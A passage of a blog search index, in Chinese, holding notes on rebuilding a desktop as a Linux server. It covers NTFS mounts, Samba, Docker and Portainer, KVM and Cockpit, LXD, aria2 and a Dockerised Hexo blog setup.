bash</p>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/","title":"\u53f0\u5f0f\u673a\u6539\u9020\u8ba1\u5212","text":"<p>\u8bb0\u5f55\u4e86\u5bf9\u5c06\u53f0\u5f0f\u673a\u4ece windows \u6362\u4f4d linux \u540e\u6298\u817e\u7684\u5404\u79cd\u5185\u5bb9</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#linux-\u6302\u8f7d-ntfs-\u5206\u533a","title":"linux \u6302\u8f7d ntfs \u5206\u533a","text":"<ul> <li> <p>\u4e0d\u8003\u8651\u548c windows \u517c\u5bb9\u7684\u8bdd\uff08\u5728 linux \u4e0b\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u5728 windows \u4e2d\u4f1a\u663e\u793a\u4e3a\u5176\u5b83\u7528\u6237\u5bfc\u81f4\u65e0\u6cd5\u8bbf\u95ee\uff09</p> <ul> <li>\u5c06 own \u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7528\u6237\u548c\u7ec4</li> <li>umask \u8868\u793a\u6587\u4ef6\u548c\u76ee\u5f55\u6743\u9650\u54ea\u4e9b\u4f4d\u4e3a 0\uff0c0022 \u5373 755</li> </ul> <pre><code>sudo mount -t ntfs-3g -o umask=0022,gid=1000,uid=1000 /dev/sda2 /home/yfy/D\n</code></pre> </li> </ul> <ul> <li> <p>\u8003\u8651\u548c windows \u517c\u5bb9\uff08\u53cc\u7cfb\u7edf\uff09\uff0c\u9700\u8981\u624b\u52a8\u8bbe\u7f6e windows \u548c linux \u7528\u6237\u6620\u5c04\u3002\u53c2\u8003\uff1apermissions - How do I use 'chmod' on an NTFS (or FAT32) partition? - Ask Ubuntu</p> <pre><code>sudo mount -t ntfs-3g -o usermapping=/home/yfy/UserMapping,umask=0022,utf8 /dev/sda2 /home/yfy/D\n</code></pre> </li> </ul> <ul> <li> <p>\u5176\u5b83</p> <ul> <li> <p>umount \u5360\u7528\u5931\u8d25</p> <pre><code>umount -l ... #lazy umount\n</code></pre> </li> </ul> <ul> <li> <p>\u6dfb\u52a0\u5230 fstab \u81ea\u52a8\u6302\u8f7d</p> <pre><code>UUID=7E3AF70F3AF6C367  /home/yfy/D  ntfs  usermapping=/home/yfy/app/ntfs-3g/UserMapping,umask=0022 0 0\n</code></pre> <p>\u8bf4\u660e\uff1a</p> <ul> <li> <p>fstab \u683c\u5f0f</p> <pre><code>[Device] [Mount Point] [File System Type] [Options] [Dump] [Pass]\n</code></pre> </li> </ul> <ul> <li> <p>device \u57df</p> <ul> <li>Label : LABEL=label</li> <li>Network ID<ul> <li>Samba : //server/share</li> <li>NFS : server:/share</li> <li>SSHFS : sshfs#user@server:/share</li> </ul> </li> <li>Device : /dev/sdxy (not recommended)</li> </ul> </li> </ul> <ul> <li> <p>\u83b7\u5f97 UUID</p> <pre><code>sudo blkid\n</code></pre> </li> </ul> </li> </ul> </li> </ul> <ul> <li> <p>\u53c2\u8003\uff1a</p> <p>\u5b98\u65b9\u6587\u6863\uff1aUbuntu Manpage: ntfs-3g - Third Generation Read/Write NTFS Driver</p> <p>\u7c7b\u4f3c\u95ee\u9898\uff1ahttps://askubuntu.com/a/514870</p> <ul> <li>\u56de\u7b54\uff1ahttps://askubuntu.com/posts/514870/edit<ul> <li>\u56de\u7b54\u4e2d\u63d0\u5230\u7684\u7f51\u9875\uff08\u56e0\u4e3a\u539f\u7f51\u9875\u4e0d\u5728\u4e86\uff0c\u4f7f\u7528\u4e86 webarchive\uff09\uff1aOwnership and Permissions (archive.org)</li> </ul> </li> </ul> <p>fstab: Fstab - Community Help Wiki (ubuntu.com)</p> </li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#linux-\u5206\u4eab-samba","title":"linux \u5206\u4eab Samba","text":"<p>https://ubuntu.com/tutorials/install-and-configure-samba#3-setting-up-samba</p> <p>Easily Install and Configure Samba File Server on Ubuntu 22.04 - kifarunix.com</p> <p>\u5b89\u88c5</p> <pre><code>sudo apt update\nsudo apt install samba\n</code></pre> <p>\u8bbe\u7f6e\u5171\u4eab\u76ee\u5f55</p> <pre><code>sudo vim /etc/samba/smb.conf\n\n[sambashare]\n    comment = Samba on Ubuntu\n    path = /home/username/sambashare\n    read only = no\n    browsable = yes\n</code></pre> <p>\u8fd0\u884c</p> <pre><code>sudo service smbd restart\n#sudo ufw allow samba\n\n#\u6dfb\u52a0\u7528\u6237\u5e76\u8bbe\u7f6e\u5bc6\u7801\nsudo smbpasswd -a username\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u547d\u4ee4\u884c\u5206\u533a","title":"\u547d\u4ee4\u884c\u5206\u533a","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#dockerportainer","title":"docker,portainer","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5b89\u88c5-docker","title":"\u5b89\u88c5 docker","text":"<pre><code>#\u6dfb\u52a0\u6e90\nsudo apt-get install \\\n    apt-transport-https \\\n    ca-certificates \\\n    curl \\\n    gnupg \\\n    lsb-release\n\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\n\necho \\\n   \"deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\\n   $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\n\n#\u5b89\u88c5\nsudo apt-get update\nsudo apt-get install docker-ce docker-ce-cli containerd.io\n\n#sudo groupadd docker\nsudo usermod -aG docker $USER\n\n#\u542f\u52a8\nsudo systemctl enable docker\nsudo systemctl start docker\n\n#\u6d4b\u8bd5\ndocker info\ndocker run --rm hello-world\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5b89\u88c5-portainer","title":"\u5b89\u88c5 portainer","text":"<pre><code>docker volume create portainer_data\n\ndocker run -d -p 9001:8000 -p 9000:9000 --name portainer \\\n    --restart=always \\\n    -v /var/run/docker.sock:/var/run/docker.sock \\\n    -v portainer_data:/data \\\n    portainer/portainer-ce\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#kvm-cockpit","title":"KVM, cockpit","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#kvm-install","title":"KVM install","text":"<p>KVM: How to Install Kvm on Ubuntu 20.04 | Linuxize</p> <pre><code>sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils virtinst virt-manager\n</code></pre> <ul> <li><code>qemu-kvm</code> - software that provides hardware emulation for the KVM hypervisor.</li> <li><code>libvirt-daemon-system</code> - configuration files to run the libvirt daemon as a system service.</li> <li><code>libvirt-clients</code> - software for managing virtualization platforms.</li> <li><code>bridge-utils</code> - a set of command-line tools for configuring ethernet bridges.</li> <li><code>virtinst</code> - a set of command-line tools for creating virtual machines.</li> <li><code>virt-manager</code> - an easy-to-use GUI interface and supporting command-line utilities for managing virtual machines through libvirt.</li> </ul> <p>brctl</p> <p>The \u201cvirbr0\u201d bridge does not have any physical interfaces added. \u201cvirbr0-nic\u201d is a virtual device with no traffic routed through it. The sole purpose of this device is to avoid changing the MAC address of the \u201cvirbr0\u201d bridge.</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#kvm-install-win10","title":"KVM install win10","text":"<p>How To Install Windows 10 on Ubuntu KVM? \u2013 GetLabsDone</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#cli","title":"CLI","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>Virsh commands cheatsheet to manage KVM guest virtual machines | ComputingForGeeks</li> <li>Commands for KVM hypervisor management | Kalle's playground (wordpress.com)</li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u57fa\u672c","title":"\u57fa\u672c","text":"<pre><code>#\u5217\u51fa\u865a\u62df\u673a(domain)\nvirsh list  #active\nvirsh list --all\n\n#\u67e5\u770b\u865a\u62df\u673a\u4fe1\u606f\nvirsh dominfo vm_name\nvirsh edit vm_name  #XML\u683c\u5f0f\n\n#\u5f00\u542f\u3001\u5173\u95ed\nvirsh start vm_name\nvirsh shutdown vm_name \nvirsh reboot vm_name\nvirsh destroy test  #\u5f3a\u5236\u5173\u95ed\nvirsh autostart vm_name #\u8bbe\u7f6e\u81ea\u52a8\u542f\u52a8\nvirsh autostart --disable vm_name #\u5173\u95ed\u8bbe\u7f6e\u81ea\u52a8\u542f\u52a8\n\n#\u6302\u8d77\nsudo virsh suspend test\nsudo virsh resume test\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5f00\u542f-vnc","title":"\u5f00\u542f VNC","text":"<pre><code>virsh shutdown &lt;domain-name&gt;\nvirsh edit &lt;domain-name&gt;\n\n#Add below XML contents within &lt;devices&gt; block\n&lt;graphics type='vnc' port='-1' autoport='yes' listen='0.0.0.0'&gt;\n  &lt;listen type='address' address='0.0.0.0'/&gt;\n&lt;/graphics&gt;\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#cockpit","title":"Cockpit","text":"<p>Cockpit: How to Install Cockpit Web Console on Ubuntu 20.04 Server (linuxtechi.com)</p> <p>\u4ec5\u9700</p> <pre><code>sudo apt install cockpit\nsudo systemctl start cockpit\n</code></pre> <p>\u7aef\u53e3\u4e3a 9090</p> <p>\u8981\u7ba1\u7406\u865a\u62df\u673a\u9700\u8981\u5b89\u88c5</p> <pre><code>sudo apt install cockpit-machines\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#lxd","title":"LXD","text":"<p>Linux Containers - LXD - Getting started</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#lxdui","title":"LXDUI","text":"<p>AdaptiveScale/lxdui: LXDUI is a web UI for the native Linux container technology LXD/LXC (github.com)</p> <ul> <li>\u4ed3\u5e93\u63d0\u4f9b\u4e86 Dockerfile\uff0c\u4f46\u662f readme \u4e2d\u6ca1\u6709\u8bf4</li> <li>\u76ee\u524d\u5b89\u88c5\u6709\u5e93\u4f9d\u8d56\u7684\u95ee\u9898\uff0c\u9700\u8981 patch \u4e00\u4e2a pull request<ul> <li>\u5c06 pull request \u5730\u5740\u6dfb\u52a0\u4e00\u4e2a.patch \u540e\u7f00\uff0c\u4fbf\u53ef\u4ee5\u4e0b\u8f7d\u4e00\u4e2a patch \u6587\u4ef6</li> <li>git am pathfiel</li> </ul> </li> </ul> <ul> <li>\u9ed8\u8ba4\u7528\u6237\u540d\u5bc6\u7801\uff1aadmin, admin</li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u4e2d\u6587\u8f93\u5165\u6cd5","title":"\u4e2d\u6587\u8f93\u5165\u6cd5","text":"<p>\u4f7f\u7528\u4e86\u9ed8\u8ba4 ibus \u7684\u4e2d\u6587\u8f93\u5165\u6cd5\uff0cctrl-\u7a7a\u683c\u5207\u6362\u5ef6\u8fdf\u6709 500ms \u6709\u70b9\u5927\u3002</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#barrier","title":"barrier","text":"<ol> <li> <p>\u95ee\u9898 1</p> <p>\u76f4\u63a5\u5b89\u88c5 barrier \u540e\uff0c\u8fde\u63a5\u65f6\u65e5\u5fd7\u663e\u793a\u6ca1\u6709 SSL \u76f8\u5173\u7684.pem \u6587\u4ef6</p> <p>\u9700\u8981\u624b\u52a8\u751f\u6210</p> <pre><code>aaa\n</code></pre> </li> <li> <p>\u95ee\u9898 2</p> <p>barrier \u76ee\u524d\u53ea\u652f\u6301 xorg\uff0c\u56e0\u6b64\u9700\u8981\u5173\u95ed ubuntu22.04 wayland</p> <pre><code>sudo vim /etc/gdm3/custom.conf\n\n#\u8bbe\u7f6e\nWaylandEnable=true --&gt; false\n\nsudo systemctl restart gdm3\n</code></pre> </li> </ol>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#aria2-\u4e0b\u8f7d\u670d\u52a1\u5668","title":"aria2 \u4e0b\u8f7d\u670d\u52a1\u5668","text":"<ul> <li> <p>\u4e0b\u8f7d aria2\uff1aaria2/aria2(github.com)</p> <p>windows \u5b98\u65b9 github \u6709\u7f16\u8bd1\u7248\uff0clinux \u6ca1\u6709\uff0c\u53ef\u4ee5\u4eceq3aql/aria2-static-builds: aria2 static builds for GNU/Linux &amp; Windows (with OpenSSL). (github.com)\u4e0b\u8f7d</p> </li> </ul> <ul> <li> <p>service</p> <p>Aria2c systemd service (github.com)</p> <pre><code>[Unit]\nDescription=Aria2c download manager\nAfter=network.target\n\n[Service]\nType=simple\nUser=www-data\nExecStart=/usr/bin/aria2c --console-log-level=warn --enable-rpc --rpc-listen-all --conf-path=/etc/aria2.daemon\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> </li> </ul> <ul> <li> <p>web</p> <ul> <li> <p>AriaNg</p> <ul> <li>\u53ea\u6709\u4e00\u4e2a htmlReleases \u00b7 mayswind/AriaNg (github.com)</li> </ul> <pre><code>[Unit]\nDescription=Aria2 webUI\nAfter=syslog.target network.target\n\n[Service]\nType=simple\nWorkingDirectory=/home/yfy/app/aria2-1.36.0/AriaNg\n\nExecStart=/usr/bin/python3 -m http.server 6801\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> </li> </ul> </li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#gui","title":"GUI","text":"<p>install alternative Desktop Environments: How to Install and Use Another Desktop Environment on Linux (howtogeek.com)</p> <p>\u5173\u952e\u8bcd\uff1a</p> <ul> <li>X windows sytem</li> </ul> <ul> <li> <p>Desktop environments</p> <ul> <li> <p>window manager</p> <p>system software that controls the placement and appearance of windows within a windowing system in a graphical user interface (GUI). It can be part of a desktop environment (DE) or be used standalone.</p> <p>Window managers are X clients that control the appearance and behaviour of the frames (\"windows\") where the various graphical applications are drawn. They determine the border, title bar, size, and ability to resize windows</p> <ul> <li>Stacking</li> <li>Tiling<ul> <li>i3</li> </ul> </li> </ul> </li> </ul> <ul> <li>applications</li> </ul> </li> </ul> <ul> <li> <p>Display manager(login manager)</p> <p>is typically a graphical user interface that is displayed at the end of the boot process in place of the default shell.</p> <ul> <li>GDM \u2014 GNOME display manager.</li> </ul> <ul> <li>LightDM \u2014 Cross-desktop display manager, can use various front-ends written in any toolkit.</li> </ul> <ul> <li>**[LXD \u2014 LXDE display manager. Can be used independent of the LXDE desktop environment.</li> </ul> <ul> <li>SDDM \u2014 QML-based display manager and successor to KDM; recommended for Plasma and LXQt.</li> </ul> <p>The X server is usually started from the X Display Manager program xdm(1) or a  similar  display  manager        program.   This  utility  is run from the system boot files and takes care of keeping the server running,        prompting for usernames and passwords, and starting up the user sessions.</p> </li> </ul> <p>Desktop environments include basically everything you see after you log into your user account on your Linux distribution\u2019s sign-in screen. The desktop itself, desktop background, panels, menus, file manager, settings windows, and many other applications and utilities all come from a desktop environment. Even each window\u2019s titlebar is provided by an application known as a window manager that comes with the desktop environment.</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#x-windows-system","title":"X Windows System","text":"<p>man X(7)</p> <p>X server \u6709\u4e24\u79cd\u542f\u52a8\u65b9\u5f0f</p> <ul> <li>login manager</li> <li>Xinit\uff1a\u4e0d\u662f\u7ed9\u7528\u6237\u4f7f\u7528\u7684\uff0c\u800c\u662f\u7528\u4e8e\u542f\u52a8 X server \u7684\u5de5\u5177</li> </ul> <pre><code> %  xrdb $HOME/.Xresources\n %  xmodmap -e \"keysym BackSpace = Delete\"\n %  mkfontdir /usr/local/lib/X11/otherfonts\n %  xset fp+ /usr/local/lib/X11/otherfonts\n %  xmodmap $HOME/.keymap.km\n %  xsetroot -solid 'rgbi:.8/.8/.8'\n %  xset b 100 400 c 50 s 1800 r on\n %  xset q\n %  twm\n %  xmag\n %  xclock -geometry 48x48-0+0 -bg blue -fg white\n %  xeyes -geometry 48x48-48+0\n %  xbiff -update 20\n %  xlsfonts '*helvetica*'\n %  xwininfo -root\n %  xdpyinfo -display joesworkstation:0\n %  xhost -joesworkstation\n %  xrefresh\n %  xwd | xwud\n %  bitmap companylogo.bm 32x32\n %  xcalc -bg blue -fg magenta\n %  xterm -geometry 80x66-0-0 -name myxterm $*\n</code></pre> <p>man Xserver(1)</p> <p>The X server is usually started from the X Display Manager program xdm(1) or a  similar  display  manager        program.   This  utility  is run from the system boot files and takes care of keeping the server running,        prompting for usernames and passwords, and starting up the user sessions.</p> <p>Installations that run more than one window system may need to use the xinit(1) utility instead of a dis\u2010        play manager.  However, xinit is to be considered a tool for building startup scripts and is not intended        for use by end users.  Site administrators are strongly urged to use a display manager,  or  build  other        interfaces for novice users.</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u5207\u6362\u684c\u9762\u73af\u5883","title":"\u5207\u6362\u684c\u9762\u73af\u5883","text":"<ul> <li>xfce: [xfce:getting-started Xfce Docs]</li> <li>How to Install and Use Another Desktop Environment on Linux (howtogeek.com)</li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#vnc","title":"VNC","text":"<p>\u4f7f\u7528 VNC \u5e76\u4e0d\u9700\u8981\u4f7f\u7528\u5230 login manager</p> <p>During installation, you may be prompted to choose a default display manager for Xfce. A display manager is a program that allows you to select and log in to a desktop environment through a graphical interface. You\u2019ll only be using Xfce when you connect with a VNC client, and in these Xfce sessions you\u2019ll already be logged in as your non-root Ubuntu user. So for the purposes of this tutorial, your choice of display manager isn\u2019t pertinent. Select either one and press <code>ENTER</code>.</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#docker-nodehexo","title":"Docker node/hexo","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u76f4\u63a5\u5b89\u88c5","title":"\u76f4\u63a5\u5b89\u88c5","text":"<p>\u6559\u7a0b\uff1ahttps://hexo.io/zh-cn/docs/index.html</p> <p>\u9996\u5148\u9700\u8981\u5b89\u88c5 node.js \u548c git\uff0c\u7136\u540e\u5b89\u88c5 hexo</p> <pre><code>npm install -g hexo-cli\n</code></pre> <p>\u5e38\u7528 hexo \u547d\u4ee4</p> <pre><code>hexo init\nhexo new \"aaa\"\n\nhexo clean #\u5220\u9664public\u76ee\u5f55(html)\nhexo g  #\u751f\u6210html\nhexo s -p PORT #\u672c\u5730server\nhexo d  #\u90e8\u7f72\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#docker-\u5b89\u88c5","title":"docker \u5b89\u88c5","text":"<ol> <li>\u57fa\u4e8e node \u57fa\u672c\u955c\u50cf\uff0c\u521b\u5efa\u4e00\u4e2a\u5305\u542b hexo \u73af\u5883\u7684 docker \u955c\u50cf\uff0c\u5165\u53e3\u70b9\u4e3a bash</li> <li>\u8fd0\u884c\u8be5\u955c\u50cf\uff0c\u5c06 blog \u76ee\u5f55\u6620\u5c04\u5230 docker \u5bb9\u5668\u4e2d\uff0c\u7136\u540e\u8fdb\u884c hexo \u64cd\u4f5c</li> <li>[\u53ef\u9009]\u90e8\u7f72\u65f6\u4e3a\u4e86\u907f\u514d\u8f93\u5165 github \u5bc6\u7801\uff0c\u53ef\u4ee5\u5c06.ssh \u548c.gitconfig \u6620\u5c04\u5230\u5bb9\u5668\u4e2d</li> </ol>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#dockerfile","title":"dockerfile","text":"<p>\u53c2\u8003</p> <ul> <li>\u522b\u4eba\u7684 dockerfile\uff1a\u4f7f\u7528 docker \u642d\u5efa Hexo - wanf3ng's blog</li> </ul> <ul> <li>\u8bbe\u7f6e\u7528\u6237\uff1a\u5728 docker \u4e2d\u57f7\u884c hexo | Plusku@blog</li> </ul> <p>\u8bf4\u660e\uff1a</p> <ul> <li>\u9ed8\u8ba4\u4e86\u7528\u6237 uid=1000\u3002\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a User node \u6765\u907f\u514d\u5bb9\u5668\u5185\u751f\u6210\u7684\u6587\u4ef6\u4e3a root \u6240\u6709\u95ee\u9898\u3002</li> <li>\u4f7f\u7528 node12.0\uff0c\u5426\u5219 hexo \u8fd0\u884c\u4f1a\u5931\u8d25</li> </ul> <pre><code>FROM node:12.6.0-alpine\n\n# \u5207\u6362\u4e2d\u79d1\u5927\u6e90\nRUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories\n# \u5b89\u88c5bash git openssh\nRUN apk add bash git openssh\n\n# \u8bbe\u7f6e\u5bb9\u5668\u65f6\u533a\u4e3a\u4e0a\u6d77\uff0c\u4e0d\u7136\u53d1\u5e03\u6587\u7ae0\u7684\u65f6\u95f4\u662f\u56fd\u9645\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u6bd4\u6211\u4eec\u665a8\u4e2a\u5c0f\u65f6\nRUN apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\\n&amp;&amp; echo \"Asia/Shanghai\" &gt; /etc/timezone \\\n&amp;&amp; apk del tzdata\n\n# \u5b89\u88c5hexo\nRUN \\ \nnpm config set registry https://registry.npm.taobao.org \\\n&amp;&amp;npm install \\\n&amp;&amp;npm install hexo-cli -g \\\n&amp;&amp; npm install hexo-server --save \\\n&amp;&amp; npm install hexo-asset-image --save \\\n&amp;&amp; npm install hexo-wordcount --save \\\n&amp;&amp; npm install hexo-generator-sitemap --save \\\n&amp;&amp; npm install hexo-generator-baidu-sitemap --save \\\n&amp;&amp; npm install hexo-deployer-git --save\n\nARG GIT_NAME\nARG GIT_EMAIL\n\nUser node\n\n# \u8bbe\u7f6egit push\u65f6\u7684\u7528\u6237\u540d\u548c\u90ae\u7bb1\nRUN \\\n git config --global user.email \"$GIT_EMAIL\" \\\n &amp;&amp; git config --global user.name \"$GIT_NAME\"\n\nWORKDIR /home/node/blog\n\nEXPOSE 4000\n\nENTRYPOINT [\"/bin/bash\"]\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#build-\u955c\u50cf","title":"build \u955c\u50cf","text":"<pre><code>docker build -t yfy/hexo-blog\\\n --build-arg GIT_NAME=\"Fuyan Yuan\"\\\n --build-arg GIT_EMAIL=\"33221728+TheRainstorm@users.noreply.github.com\"\\\n .\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<pre><code>docker run -it --name hexo-blog\\\n -p 4000:4000 \\\n -v /home/yfy/Documents/hexo-blog:/home/node/blog/ \\\n -v /home/yfy/.ssh:/home/node/.ssh\\\n yfy/hexo-blog\n</code></pre> <p>\u5982\u679c blog \u4e0b\u6ca1\u6709 node_modules\uff0c\u5219\u9700\u8981</p> <pre><code>npm install\n</code></pre> <p>\u4e4b\u540e\u6b63\u5e38\u4f7f\u7528 hexo \u5373\u53ef</p> <p>docker \u6280\u5de7\uff1a\u8fde\u63a5\u5230\u5df2\u6709\u5bb9\u5668\u3002</p> 